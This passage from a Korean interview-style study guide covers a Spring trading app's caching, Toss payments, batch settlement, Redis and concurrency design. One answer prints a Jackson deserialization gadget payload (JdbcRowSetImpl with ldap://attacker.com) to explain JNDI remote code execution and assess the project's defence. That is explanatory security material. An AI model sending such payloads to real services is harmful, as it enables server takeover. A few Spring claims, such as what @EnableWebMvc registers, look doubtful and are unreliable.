1. **`PropertySourcesPlaceholderConfigurer` 빈**: `@Value("${...}")` 표현식을 해석하려면 이 빈이 컨텍스트에 있어야 한다. `@EnableWebMvc`에 의해 자동 등록되거나, `MvcConfig`가 `WebMvcConfigurer`를 구현하면서 `<mvc:annotation-driven>`에서 등록된다.
2. **컨텍스트 계층 주의**: `@PropertySource`는 해당 `@Configuration`이 등록된 컨텍스트에만 적용된다. `root-context.xml`이 `MvcConfig`를 스캔하므로 Root 컨텍스트에 프로퍼티가 등록된다. Servlet 컨텍스트의 빈이 Root 컨텍스트 프로퍼티를 참조하면 문제없지만, 반대는 안 된다.
3. **`${redis.password:}` 기본값**: `:`로 기본값 지정. 프로퍼티 없거나 비어있으면 빈 문자열. `NullPointerException` 방지.

---

### [프로젝트-4-10]
**이 프로젝트에서 `@Cacheable`이 적용된 메서드를 같은 클래스 내에서 호출할 때 캐시가 동작하지 않는 문제가 발생할 수 있는 경우를 설명하세요.**

**답변:**
Spring의 `@Cacheable`은 AOP 프록시 기반으로 동작한다. 같은 클래스 내부에서 메서드를 직접 호출하면(`this.search(trade_seq)`) 프록시를 거치지 않아 캐시가 동작하지 않는다(self-invocation 문제).

예시: `TradeService.someMethod()` 내에서 `this.search(trade_seq)` 호출 → `@Cacheable` 무시, 항상 DB 조회.

이 프로젝트에서의 현황:
- `TradeService.search()`는 외부(Controller)에서 호출되므로 캐시가 정상 동작.
- `completePurchaseAndNotify()` 내부에서 `search()`를 직접 호출한다면 캐시 미적용.

해결 방법:
1. `ApplicationContext`에서 자기 자신의 빈을 주입받아 프록시 통해 호출
2. 캐시 로직을 별도 빈(클래스)으로 분리

---

### [프로젝트-4-11]
**`BookClubService`와 `TradeService`에서 이미지 업로드/삭제를 `ImgService` 인터페이스로 추상화한 이유를 설명하세요.**

**답변:**
`ImgService` 인터페이스를 구현하는 두 구현체:
- `FileUploadService`: 로컬 파일시스템에 저장 (개발 환경)
- `S3Service`: AWS S3에 저장 (`@Primary`, 운영 환경)

`@Primary`로 `S3Service`가 자동 주입되므로 서비스 코드는 `ImgService`에만 의존하며, 어떤 구현체인지 알 필요가 없다(DIP, Dependency Inversion Principle). 운영/개발 환경 전환 시 `@Primary` 변경 또는 `@Profile`로 조건부 등록하면 서비스 코드 변경 없이 스토리지를 전환할 수 있다.

---

### [프로젝트-4-12]
**Toss 결제 과정에서 IDOR(Insecure Direct Object Reference) 공격을 어떻게 방어하고 있는지 설명하세요.**

**답변:**
IDOR: 타인의 리소스에 직접 접근하는 공격. 예: `trade_seq=123`의 구매자가 아닌데 URL에 123을 넣어 결제 완료 처리.

방어 로직:
1. **결제 페이지 진입**: `pendingBuyerSeq`와 세션의 `member_seq` 비교. 일치하지 않으면 리다이렉트.
2. **결제 성공 처리 시**: `paymentCheck.getPendingBuyerSeq().equals(buyer.getMember_seq())`를 **재확인**. Toss 승인 API 호출 후에도 다시 검증(TOCTOU 방지).
3. **결제 실패/타임아웃**: `chatroomService.isBuyerOfTrade(trade_seq, member_seq)`로 채팅방 참여자(구매자)인지 확인.
4. **판매자 결제 불가**: `trade.getMember_seller_seq() == sessionMember.getMember_seq()`이면 결제 페이지 접근 차단.

---

### [프로젝트-4-13]
**`SettlementService`의 `requestSettlement()`에서 `tradeMapper.findBySeqForUpdate(trade_seq)`를 사용하는 이유를 설명하세요.**

**답변:**
`findBySeqForUpdate`는 `SELECT ... FOR UPDATE`로 해당 trade 행에 배타적 락을 건다. 정산 신청 시:
1. 두 명의 판매자가 동시에 같은 거래에 정산 신청(실제로는 1명이지만 중복 클릭 등)
2. 둘 다 `settlement_st = READY` 확인 후 INSERT 진행 가능성

`FOR UPDATE`로 첫 번째 트랜잭션이 락을 획득하면 두 번째는 대기. 첫 번째가 INSERT 후 `settlement_st → REQUESTED`로 변경하고 커밋. 두 번째가 락을 획득했을 때 `settlement_st`가 이미 `REQUESTED`이므로 중복 정산 신청을 차단하는 검증을 통과하지 못한다.

---

### [프로젝트-4-14]
**`WebClientConfig`에서 `WebClient`를 빈으로 등록할 때 Toss API의 Base URL과 인증 헤더를 설정하는 방식을 설명하세요.**

**답변:**
`WebClient.builder()`로 `tossPaymentWebClient` 빈 생성 시:
```java
WebClient.builder()
    .baseUrl("https://api.tosspayments.com")
    .defaultHeader(HttpHeaders.AUTHORIZATION, 
        "Basic " + Base64.encode(secretKey + ":"))
    .defaultHeader(HttpHeaders.CONTENT_TYPE, MediaType.APPLICATION_JSON_VALUE)
    .build();
```
Toss API는 `Basic` 인증 방식으로 `secretKey:`를 Base64 인코딩해 Authorization 헤더에 포함한다. `WebClient` 빈에 미리 설정하면 `TossApiService`에서 매 요청마다 헤더를 반복 설정하지 않아도 된다. `secretKey`는 `application.properties`에서 `@Value`로 주입해 코드에 하드코딩하지 않는다.

---

---

## LEVEL 5

### [개념-5-1]
**Spring Batch의 `JobRepository`가 하는 역할과, 이 프로젝트처럼 별도 DB 스키마 없이 사용할 때 주의점을 설명하세요.**

**답변:**
`JobRepository`는 Spring Batch의 메타데이터 저장소다. `JobInstance`, `JobExecution`, `StepExecution`, `ExecutionContext` 등을 DB에 저장하고 조회한다. 기본 테이블은 `BATCH_JOB_INSTANCE`, `BATCH_JOB_EXECUTION`, `BATCH_STEP_EXECUTION` 등이다.

`@EnableBatchProcessing` 선언 시 `DefaultBatchConfigurer`가 자동으로 `@Primary` DataSource와 `PlatformTransactionManager`를 사용해 `JobRepository`를 구성한다. 별도 설정 없으면 실제 MySQL DB에 배치 메타 테이블이 생성된다.

주의점:
1. **테이블 생성**: 배치 메타 테이블이 MySQL에 미리 생성되어 있어야 한다(`schema-mysql.sql` 실행).
2. **기존 DB 오염**: 비즈니스 테이블과 배치 메타 테이블이 같은 DB에 혼재.
3. **`run.id` 누적**: 매 실행마다 새 `JobExecution` 레코드가 쌓임. 정기적 정리 필요.
4. **해결책**: 배치 전용 DataSource를 분리하거나, `MapJobRepositoryFactoryBean`(인메모리, 테스트용)을 사용.

---

### [개념-5-2]
**AES-CBC 모드와 AES-GCM 모드의 차이를 설명하고, 이 프로젝트에서 GCM 대신 CBC를 선택했을 때의 보안 차이를 설명하세요.**

**답변:**
| | AES-CBC | AES-GCM |
|---|---|---|
| 인증 | 없음(기밀성만 제공) | AEAD(인증+기밀성) |
| Padding | PKCS5/PKCS7 필요 | 없음 |
| Padding Oracle | 취약 가능 | 없음 |
| 병렬화 | 암호화 불가, 복호화 가능 | 암호화/복호화 모두 병렬 가능 |
| 태그 | 없음 | 인증 태그(16바이트) |

**GCM의 장점:**
- 데이터 무결성 보장(인증 태그). 암호문이 변조되면 복호화 시 예외 발생.
- Padding Oracle 공격 불가.

**CBC의 위험:**
- 암호문을 임의 변조해도 복호화 시 다른 평문이 나올 뿐 예외가 발생하지 않을 수 있다.
- Padding Oracle 공격에 취약(이 프로젝트에서는 복호화 실패 시 `RuntimeException`으로 처리하므로 오라클 노출 가능성 있음).

이 프로젝트에서 GCM으로 전환하면 보안이 향상되며, `IvParameterSpec` 대신 `GCMParameterSpec(128, iv)`를 사용하면 된다.

---

### [개념-5-3]
**Redis의 메모리 관리 정책(Eviction Policy) 종류와, 캐시 서버로 사용할 때 적절한 정책을 설명하세요.**

**답변:**
| 정책 | 설명 |
|---|---|
| `noeviction` | 가득 차면 쓰기 거부 (기본값) |
| `allkeys-lru` | 전체 키 중 LRU(Least Recently Used) 제거 |
| `volatile-lru` | TTL 있는 키 중 LRU 제거 |
| `allkeys-lfu` | 전체 키 중 LFU(Least Frequently Used) 제거 |
| `volatile-ttl` | TTL 가장 짧은 키 제거 |
| `allkeys-random` | 전체 키 무작위 제거 |

**이 프로젝트 권장:**
- Redis를 캐시(trade, bookClub) + 세션(Spring Session) + Pub/Sub + logout 관리로 혼합 사용.
- 세션 키와 logout 키는 삭제되면 안 되므로 `volatile-lru` 권장: TTL 없는 키(세션, logout)는 보호되고, TTL 있는 캐시 키를 LRU로 제거.
- 캐시 전용이라면 `allkeys-lru`가 이상적.
- 운영 시 `maxmemory` 설정과 적절한 eviction 정책 조합이 필수.

---

### [개념-5-4]
**Spring Security의 `FilterChainProxy`가 여러 Security Filter를 실행하는 내부 구조와, `DelegatingFilterProxy`와의 관계를 설명하세요.**

**답변:**
`DelegatingFilterProxy`(Servlet 필터): 서블릿 컨테이너(Tomcat)와 Spring 컨텍스트를 연결하는 브릿지. `web.xml`에 `springSecurityFilterChain`으로 등록. 실제 처리는 Spring 빈인 `FilterChainProxy`에 위임.

`FilterChainProxy`(Spring Bean): Security Filter Chain 목록을 관리. 요청 URL에 따라 적합한 `SecurityFilterChain`을 선택해 실행.

`SecurityFilterChain` 내 주요 필터 순서:
1. `SecurityContextPersistenceFilter`: 세션에서 `SecurityContext` 로드/저장
2. `CsrfFilter`: CSRF 토큰 검증
3. `UsernamePasswordAuthenticationFilter`: 폼 로그인 처리 (이 프로젝트에서는 `.formLogin().disable()`)
4. `ExceptionTranslationFilter`: 인증/인가 예외를 HTTP 응답으로 변환
5. `FilterSecurityInterceptor`: URL 기반 인가 처리

이 프로젝트에서 `SecurityConfig`는 `anyRequest().permitAll()`로 모든 요청을 허용하고 CSRF 처리와 AccessDeniedHandler만 커스터마이징한다.

---

### [개념-5-5]
**WebSocket HTTP Upgrade 과정과, WebSocket 세션과 HTTP 세션이 다른 생명주기를 가지는 이유를 설명하세요.**

**답변:**
**HTTP → WebSocket Upgrade:**
1. 클라이언트: `GET /chatEndPoint HTTP/1.1` + `Upgrade: websocket` + `Connection: Upgrade` + `Sec-WebSocket-Key`
2. 서버: `101 Switching Protocols` + `Upgrade: websocket` + `Sec-WebSocket-Accept`
3. 이후 TCP 연결을 유지하며 WebSocket 프레임 교환

**세션 생명주기 차이:**
- **HTTP 세션**: 요청마다 독립적. 세션 ID 쿠키로 연결. Redis에 저장. 만료 시간(30분)이 있음.
- **WebSocket 세션**: 연결이 유지되는 동안 지속. 클라이언트가 연결을 끊거나 서버가 닫을 때 종료. HTTP 세션 만료와 무관하게 WebSocket 연결은 유지될 수 있음.

**이 프로젝트의 문제:**
`HttpSessionHandshakeInterceptor`가 Handshake 시점에 HTTP 세션 속성을 WebSocket 세션으로 복사한다. HTTP 세션이 만료되어도 WebSocket 세션의 복사본은 유지된다. 장시간 채팅 시 HTTP 세션은 만료됐으나 WebSocket 연결은 유지된 상태가 될 수 있다. 이 경우 메시지 전송은 가능하지만 일반 HTTP 요청은 로그아웃 상태가 된다.

---

### [개념-5-6]
**분산 캐시 환경에서 Cache Stampede(캐시 스탬피드) 현상을 설명하고, 이 프로젝트에서 발생 가능한 시나리오와 대응 방법을 설명하세요.**

**답변:**
**Cache Stampede**: 인기 캐시 키가 만료되는 순간 다수의 요청이 동시에 캐시 미스를 감지하고 모두 DB에 직접 쿼리해 DB에 과부하가 걸리는 현상. DB 응답이 오기 전까지 모든 요청이 DB를 직접 타격한다.

**이 프로젝트 시나리오:**
- 트래픽이 많은 인기 판매글(`trade` 캐시 TTL=10분) 만료 순간, 수백 개의 동시 요청이 `tradeMapper.findBySeq(trade_seq)`를 실행.
- `tradeList` 캐시 만료 시 목록 쿼리 폭주.

**대응 방법:**
1. **Lock(뮤텍스) 재구성**: 첫 번째 요청만 DB 조회, 나머지는 대기. `RedisTemplate.setnx(lockKey)`로 분산 락 구현.
2. **Probabilistic Early Expiration**: TTL 만료 전 확률적으로 미리 캐시 갱신.
3. **TTL에 랜덤 지터(Jitter) 추가**: 같은 시간에 여러 캐시가 동시 만료되지 않도록 TTL에 ±랜덤 값 추가.
4. **이중 캐시(Stale-while-revalidate)**: 만료된 캐시도 잠시 서빙하며 백그라운드에서 갱신.

---

### [프로젝트-5-1]
**`SettlementBatchIntegrationTest`에서 실제 배치를 테스트할 때 트랜잭션 격리 전략을 설명하세요. 테스트 간 데이터가 오염되지 않으려면 어떻게 해야 하나요?**

**답변:**
Spring Batch 통합 테스트의 격리 문제:
- Spring Batch는 `JobRepository`에 메타데이터를 **별도 트랜잭션**으로 커밋한다. `@Transactional` 테스트에서 롤백해도 배치 메타 테이블의 데이터는 남는다.
- 청크 트랜잭션도 독립적으로 커밋하므로 `@Rollback`이 정산 데이터를 롤백하지 못한다.

올바른 격리 전략:
1. **H2 인메모리 DB**: `schema-h2.sql`로 테스트마다 스키마 초기화. 이 프로젝트에서 이미 `schema-h2.sql` 존재.
2. **`@BeforeEach`/`@AfterEach`로 데이터 정리**: 각 테스트 전후 `DELETE FROM` 실행.
3. **`@Transactional` 미적용**: 배치 테스트는 롤백이 동작하지 않으므로 `@Transactional` 없이 명시적 정리 코드 작성.
4. **`JobRepositoryTestUtils`**: Spring Batch 제공 유틸로 테스트 후 배치 메타 데이터 정리.

---

### [프로젝트-5-2]
**안전결제 요청(`requestSafePayment`)에서 두 구매자가 동시에 같은 판매글에 요청할 때의 경쟁 조건(Race Condition)을 DB 레벨에서 분석하세요.**

**답변:**
```sql
UPDATE sb_trade_info
SET safe_payment_st = 'PENDING',
    pending_buyer_seq = #{pending_buyer_seq},
    safe_payment_expire_dtm = DATE_ADD(NOW(), INTERVAL 5 MINUTE)
WHERE trade_seq = #{trade_seq}
  AND safe_payment_st = 'NONE'
```

**시나리오 분석(MySQL InnoDB):**
1. 구매자 A, B가 같은 `trade_seq`에 동시에 UPDATE 전송
2. MySQL이 두 UPDATE를 직렬화: 먼저 도달한 A의 UPDATE가 해당 행에 **묵시적 배타 락** 획득
3. A: `safe_payment_st='NONE'` 조건 충족 → 1 row updated → 커밋
4. B: A가 커밋한 후 락 해제 → B의 UPDATE 실행 → `safe_payment_st='NONE'` 조건 불충족(이미 'PENDING') → 0 rows
5. B: `updated = 0` → `false` → 에러 메시지 브로드캐스트

**중요**: MySQL의 UPDATE는 행 단위로 암시적 배타 락을 걸므로, 별도 `SELECT FOR UPDATE` 없이도 이 패턴이 안전하다. 단, 여러 행을 동시에 처리하거나 RDB가 아닌 경우에는 동작이 달라질 수 있다.

---

### [프로젝트-5-3]
**Redis Pub/Sub 기반 채팅에서 서버가 재시작될 때 발생하는 메시지 유실 문제와 이 프로젝트의 대응 방식을 설명하세요.**

**답변:**
**문제:**
- Redis Pub/Sub은 At-most-once 전달. 구독자(서버)가 오프라인 상태에서 발행된 메시지는 유실.
- 서버 재시작 시 `RedisMessageListenerContainer`의 구독이 끊어졌다가 재연결. 그 사이 발행된 메시지는 수신 불가.
- WebSocket 연결도 서버 재시작 시 끊어짐. 클라이언트가 SockJS 재연결하면 새 세션.

**이 프로젝트의 대응:**
1. **DB 저장 우선**: 모든 채팅 메시지를 DB에 먼저 저장(`messageService.saveMessage()`). Pub/Sub 유실과 무관하게 DB에 메시지가 남아있다.
2. **채팅방 진입 시 이전 메시지 로드**: 클라이언트가 채팅방에 접속하면 DB에서 이전 메시지를 조회해 화면에 표시.
3. **미흡한 부분**: 실시간 전달 실패 시(Pub/Sub 유실) 상대방이 새로운 메시지가 있음을 즉시 알 수 없다. `UnreadInterceptor`로 다음 페이지 방문 시 읽지 않은 메시지를 체크하는 방식으로 보완하고 있으나, 실시간 알림은 제한적이다.

---

### [프로젝트-5-4]
**`SettlementItemWriter`에서 `updateToCompleted`가 0 rows를 반환할 때 `IllegalStateException`으로 처리하는 이유와, 이것이 `InsufficientBalanceException` skip 처리와 어떻게 다른지 설명하세요.**

**답변:**
두 예외의 의미가 근본적으로 다르다:

**`InsufficientBalanceException`:**
- 예측 가능한 비즈니스 예외. "관리자 잔액이 부족하다"는 정상적인 상황.
- 해당 건을 skip하고 나머지 건을 계속 처리하는 것이 올바른 동작.
- `INSUFFICIENT_BALANCE` 상태로 기록 후 관리자가 잔액 충전 후 재처리.

**`IllegalStateException`:**
- 예측 불가능한 시스템 상태 오류. "이미 처리된 건이 왜 REQUESTED 상태로 조회됐는가?"
- 동시 배치 실행 버그이거나 데이터 무결성 문제. Skip 후 계속 처리하면 안 됨.
- Job 전체를 FAILED로 종료시켜 관리자가 원인 파악 후 수동 처리하도록.

Skip 정책에 `InsufficientBalanceException.class`만 명시하고 `IllegalStateException`은 포함하지 않음으로써, 비즈니스 예외(skip 가능)와 시스템 예외(Job 중단)를 명확히 구분한다.

---

### [프로젝트-5-5]
**결제 완료 처리(`completePurchaseAndNotify`) 후 배치 정산 처리(`SettlementItemWriter`)까지의 전체 트랜잭션 흐름을 추적하세요. 각 단계의 트랜잭션 경계와 락을 설명하세요.**

**답변:**
**1단계: 구매자 결제 완료** (`completePurchaseAndNotify` - 단일 트랜잭션)
- `tradeMapper.successPurchase()`: `safe_payment_st → COMPLETED`, `sale_st → SOLD`, 구매자 지정
- `settlementMapper.increaseAdminBalance()`: 관리자 잔액 += 결제 금액
- `messageService.saveMessage()`: 결제 완료 메시지 DB 저장
- 커밋 → `afterCommit()`: Pub/Sub 메시지 발행

**2단계: 판매자 정산 신청** (`SettlementService.requestSettlement` - 단일 트랜잭션)
- `tradeMapper.findBySeqForUpdate()`: trade 행 배타 락
- 검증(판매자 본인, 안전결제 완료, 구매확정, settlement_st=READY)
- `settlementMapper.insertSettlement()`: 정산 신청 INSERT
- `tradeMapper.updateTradeSettlementSt()`: `settlement_st → REQUESTED`
- 커밋

**3단계: 배치 정산 처리** (`SettlementItemWriter` - 건별 독립 트랜잭션, chunk=1)
- `getAdminBalance FOR UPDATE`: admin_account 행 배타 락
- 잔액 확인
- `updateToCompleted WHERE settlement_st='REQUESTED'`: 상태 변경 + 멱등성 보장
- `insertAccountLog`: 이체 로그
- `updateTradeSettlementSt COMPLETED`: trade 상태 갱신
- `updateAdminBalance`: 잔액 차감
- 커밋

총 3개의 독립 트랜잭션이 순서대로 실행되며, 각 단계 사이에 트랜잭션 간격이 있다.

---

### [프로젝트-5-6]
**`RedisCacheConfig`와 `RedisConfig`가 모두 `RedisConnectionFactory`를 정의하는 경우 빈 충돌이 발생하는지 확인하고, 현재 구성이 올바른지 분석하세요.**

**답변:**
현재 코드 분석:
- `RedisCacheConfig.redisConnectionFactory()`: `@Bean`으로 `LettuceConnectionFactory` 생성. SSL, 비밀번호, DB 인덱스 등 세부 설정.
- `RedisConfig`: `redisConnectionFactory` 빈 없음. `@Bean`으로 `StringRedisTemplate`, `RedisTemplate`, Pub/Sub 관련 빈만 정의. `RedisConnectionFactory`를 파라미터로 주입받아 사용.

결론: `RedisConnectionFactory` 빈은 `RedisCacheConfig`에서 단 하나만 정의된다. `RedisConfig`의 빈들은 이 빈을 주입받아 사용하므로 충돌 없이 동일한 Redis 연결을 공유한다.

**잠재적 문제**: `StringRedisTemplate`이 `RedisCacheConfig.redisConnectionFactory()`를 사용하는데, Spring Session의 `@EnableRedisHttpSession`도 컨텍스트의 `RedisConnectionFactory`를 자동으로 찾아 사용한다. 세 가지 기능(캐시, Pub/Sub, 세션)이 모두 같은 Redis 연결을 사용한다. 기능별로 Redis DB를 분리(`redis.database` 설정)하지 않으면 키 패턴이 섞인다.

---

### [프로젝트-5-7]
**`MemberActivityInterceptor`의 강제 로그아웃 처리가 다중 서버 환경에서 어떻게 동작하는지 설명하고, `InMemoryLogoutPendingManager` 대신 `RedisLogoutPendingManager`를 사용해야 하는 이유를 구체적으로 설명하세요.**

**답변:**
**관리자가 사용자 A를 강제 로그아웃 처리:**
1. 관리자 → `AdminController`: `logoutPendingManager.addForceLogout(MEMBER, memberSeq)` 호출
2. `RedisLogoutPendingManager`: Redis에 `logout:force:MEMBER:{seq} = "true"` 저장 (TTL 24시간)

**사용자 A의 다음 요청:**
3. 사용자 A의 요청이 **서버 B**에 도달 (서버 A에서 강제 로그아웃 설정했어도)
4. `MemberActivityInterceptor.preHandle()` → `logoutPendingManager.isForceLogout(MEMBER, seq)`
5. `RedisLogoutPendingManager`: Redis에서 `logout:force:MEMBER:{seq}` 키 확인 → 존재 → `true`
6. 세션 무효화 + Redis 키 삭제 → 로그아웃 처리

**`InMemoryLogoutPendingManager`를 사용했을 경우:**
- 서버 A의 메모리에만 강제 로그아웃 플래그가 저장됨
- 서버 B에는 플래그 없음 → 서버 B로 요청이 가면 강제 로그아웃 미실행
- 서버 A로 요청이 갈 때만 로그아웃됨

Redis를 사용하면 어떤 서버에 요청이 가도 일관된 강제 로그아웃 처리가 보장된다.

---

### [프로젝트-5-8]
**`pubsubObjectMapper`에서 `activateDefaultTyping`을 사용할 때 발생할 수 있는 Jackson Deserialization 취약점을 설명하고, 이 프로젝트의 방어가 충분한지 평가하세요.**

**답변:**
**Jackson Deserialization 취약점 (CVE-2017-7525 계열):**
`activateDefaultTyping`이 활성화되면 JSON의 타입 정보를 그대로 클래스 로딩에 사용한다. 공격자가 악의적인 JSON을 주입할 수 있다면:
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker.com/...","autoCommit":true}]
```
이 클래스가 인스턴스화되면서 JNDI Lookup으로 원격 코드 실행(RCE)이 가능하다.

**이 프로젝트의 방어:**
`BasicPolymorphicTypeValidator.builder().allowIfSubType("project.").allowIfSubType("java.util.").allowIfSubType("java.time.").build()`

허용 패키지를 명시적으로 제한하므로 `com.sun.*`, `org.apache.*` 등 위험 클래스가 차단된다. `allowIfSubType` 조건을 벗어난 타입은 역직렬화 거부.

**평가: 충분하지만 주의 필요.** Redis가 외부에서 직접 접근 가능하면(Redis 인증 없이 공개 노출) 공격자가 직접 채널에 메시지를 주입할 수 있다. Redis를 반드시 인증(`redis.password`)과 내부 네트워크 격리로 보호해야 한다.

---

### [프로젝트-5-9]
**`TradeService`의 캐시 설계에서 `@Cacheable(value="trade", key="#trade_seq")`와 `@CacheEvict(value="tradeList", allEntries=true)`를 조합할 때 발생할 수 있는 캐시 정합성 문제를 설명하세요.**

**답변:**
**문제 시나리오 - 수정(modify) 시:**
1. `trade:123` 캐시 히트 → 구버전 데이터 반환 가능 시간 = 수정 ~ `@CacheEvict` 실행 전
2. `@CacheEvict(value="trade", key="#trade_seq")` → `trade:123` 삭제
3. 그러나 `@Transactional @CacheEvict`는 메서드가 정상 종료(커밋) 후 캐시 삭제

**실제 정합성 위험:**
- `@CacheEvict`의 기본 동작은 메서드 실행 후(`afterInvocation=true`). 트랜잭션 커밋과 캐시 삭제 사이 극히 짧은 시간에 구버전 캐시가 반환될 수 있다.
- **다중 서버 환경**: 서버 A에서 수정 + 캐시 삭제, 서버 B의 로컬 캐시(여기서는 Redis라 문제 없음)에는 자동 삭제.
- **`allEntries=true` 비용**: `tradeList` 캐시를 전부 삭제하므로 다음 목록 조회 시 전부 DB 조회. 트래픽이 많은 시간에 목록 수정이 많으면 Cache Stampede 위험.

**개선 방안:**
- `@CacheEvict(beforeInvocation=true)`로 메서드 실행 전 삭제(더 짧은 불일치 시간)
- `tradeList`를 `allEntries` 대신 정교한 키로 선택적 무효화
- Cache-Aside 패턴에서 Write-Through로 전환(`@CachePut`)

---

### [프로젝트-5-10]
**`completePurchaseAndNotify()`에서 트랜잭션이 롤백된 후 `tossApiService.cancelPayment()`를 `PaymentController`에서 호출하는 구조가 가진 보상 트랜잭션(Saga 패턴) 관점의 문제를 분석하세요.**

**답변:**
**현재 구조:**
```
Toss 결제 승인 → DB 처리 → 예외 발생 → 트랜잭션 롤백
                                          → cancelPayment() 호출
```

**Saga 패턴 관점의 문제:**

1. **보상 트랜잭션 실패 시 불일치 영구화:**
   - Toss 결제 승인 완료 → DB 롤백 → `cancelPayment()` 실패 → **결제 완료 + DB 미반영** 영구 상태
   - 이 상태를 복구할 자동화 메커니즘이 없음

2. **멱등성 부재:**
   - 서버 재시작이나 타임아웃으로 `cancelPayment()`가 두 번 호출되면 Toss에서 이미 취소된 결제에 중복 취소 요청

3. **보상 단계 누락:**
   - `increaseAdminBalance()`가 성공한 후 이후 단계에서 실패하면 관리자 잔액은 증가했으나 결제 기록 없음. `cancelPayment()`는 Toss만 취소하고 관리자 잔액 감소는 처리하지 않음

**개선 방향:**
- Outbox 패턴: DB에 "결제 완료 이벤트"를 같은 트랜잭션에 저장, 별도 Worker가 Toss API 호출
- 실패 건을 별도 테이블에 기록해 관리자 수동 처리 또는 재시도 배치 실행

---

### [프로젝트-5-11]
**`@EnableWebMvc`와 `servlet-context.xml`의 `<mvc:annotation-driven>`이 동시에 존재할 때 어떤 문제가 발생하는지 분석하세요.**

**답변:**
`@EnableWebMvc`와 `<mvc:annotation-driven>`은 동일한 역할: `RequestMappingHandlerMapping`, `RequestMappingHandlerAdapter`, `ExceptionHandlerExceptionResolver` 등 MVC 인프라 빈 등록.

**문제:**
- `@EnableWebMvc`는 Root 컨텍스트(`root-context.xml` → `MvcConfig`)에서 활성화
- `<mvc:annotation-driven>`은 Servlet 컨텍스트(`servlet-context.xml`)에서 활성화
- 두 컨텍스트에 동일 빈이 중복 등록

**실제 영향:**
- `RequestMappingHandlerMapping` 등이 두 컨텍스트에 모두 등록
- Servlet 컨텍스트가 Root 컨텍스트를 포함하므로 Servlet 컨텍스트의 빈이 우선
- 동작에는 문제 없을 수 있으나, 중복 초기화로 불필요한 오버헤드 발생
- `WebMvcConfigurer`(`MvcConfig`)의 커스터마이징이 어느 컨텍스트에 적용되는지 모호해짐

**올바른 구성:** `@EnableWebMvc`를 Servlet 컨텍스트에서만 활성화(Java Config만 사용하거나 XML만 사용)하거나, `servlet-context.xml`에서 `<mvc:annotation-driven>` 제거.

---

### [프로젝트-5-12]
**`SettlementService.markAsInsufficient()`가 `SkipListener`에서 호출될 때 Spring의 트랜잭션 전파 규칙이 실제로 어떻게 적용되는지 Thread와 Transaction 컨텍스트 레벨에서 설명하세요.**

**답변:**
Spring 트랜잭션은 `ThreadLocal<TransactionStatus>`로 관리된다. 같은 스레드에서 실행되는 코드는 `TransactionSynchronizationManager`를 통해 현재 트랜잭션에 접근한다.

**Skip 발생 시 흐름:**
1. Chunk 트랜잭션: 스레드 T1에 트랜잭션 TX1 바인딩
2. `SettlementItemWriter.write()` → `InsufficientBalanceException` 발생
3. Spring Batch: TX1 **롤백**, ThreadLocal에서 TX1 **제거**
4. Same Thread T1: Spring Batch가 `SkipListener.onSkipInWrite()` 호출
5. 이 시점 T1의 ThreadLocal에 활성 트랜잭션 없음
6. `settlementService.markAsInsufficient()` 호출 → `@Transactional(REQUIRES_NEW)`
7. Spring이 T1에 새 트랜잭션 TX2 시작 + ThreadLocal에 TX2 바인딩
8. `updateToInsufficient()` + `updateTradeSettlementSt()` 실행 → TX2 커밋
9. ThreadLocal에서 TX2 제거

핵심: 같은 스레드지만 서로 다른 트랜잭션. REQUIRES_NEW가 `TransactionSynchronizationManager`에서 현재 활성 트랜잭션을 일시 중단(없으면 생략) 후 새 트랜잭션을 시작하는 방식으로 동작한다.

---

### [프로젝트-5-13]
**`TransactionSynchronizationManager.isSynchronizationActive()`가 false인 상황에서 `scheduleImageDeletionAfterCommit()`이 이미지 삭제를 skip하는 방식의 문제점과 해결 방안을 설명하세요.**

**답변:**
**현재 코드:**
```java
if (TransactionSynchronizationManager.isSynchronizationActive()) {
    // afterCommit으로 삭제 예약
} else {
    log.warn("No active transaction, skipping image deletion");
    // 아무것도 안 함 → 이미지 유실(S3에 고아 파일 남음)
}
```

**문제점:**
1. **이미지 유실(S3 비용 낭비)**: 트랜잭션 없이 삭제를 skip하면 S3에 더 이상 참조되지 않는 파일이 영구적으로 남는다.
2. **발생 시나리오**: 테스트 코드에서 `@Transactional` 없이 `TradeService.remove()` 호출, 또는 트랜잭션 전파가 `NOT_SUPPORTED`인 컨텍스트에서 호출.

**해결 방안:**
1. **즉시 삭제(fallback)**: 트랜잭션이 없으면 즉시 `imgService.deleteByUrl()` 실행:
```java
} else {
    imgService.deleteByUrl(url); // 트랜잭션 없으면 즉시 삭제
}
```
2. **Outbox 테이블**: "삭제 예정 이미지" 테이블에 기록, 배치가 주기적으로 처리.
3. **S3 Lifecycle Rule**: 일정 기간 미참조 파일 자동 삭제(tag 기반).

---

### [프로젝트-5-14]
**이 프로젝트에서 다중 서버 배포 시 발생할 수 있는 모든 문제와 각각의 해결책을 종합적으로 정리하세요.**

**답변:**
**1. 세션 공유** → Redis Spring Session으로 해결됨 ✅

**2. 채팅 Pub/Sub** → Redis Pub/Sub으로 해결됨 ✅

**3. 스케줄러 중복 실행:**
- `SafePaymentScheduler`, `SettlementScheduler`가 모든 서버에서 동시 실행
- 정산 배치: `updateToCompleted WHERE settlement_st='REQUESTED'` 조건으로 부분 방어
- 안전결제 초기화: `UPDATE WHERE expire < NOW()`으로 idempotent(중복 실행 무해)
- 개선: **ShedLock** 적용으로 확실한 단일 실행 보장

**4. 강제 로그아웃** → Redis 기반 `RedisLogoutPendingManager`로 해결됨 ✅

**5. @Cacheable self-invocation:**
- 같은 클래스 내부 호출 시 캐시 미동작 가능성
- 확인 및 빈 분리 필요

**6. S3 이미지 삭제 skip:**
- 트랜잭션 없는 컨텍스트에서 이미지 미삭제
- fallback 즉시 삭제 또는 Outbox 패턴 필요

**7. 배치 메타 DB 공유:**
- Spring Batch 메타 테이블이 비즈니스 DB에 혼재
- 배치 전용 DataSource 분리 권장

**8. Redis SPOF:**
- 단일 Redis 장애 시 세션, 캐시, Pub/Sub 전부 중단
- Redis Sentinel 또는 Cluster 구성 필요

---
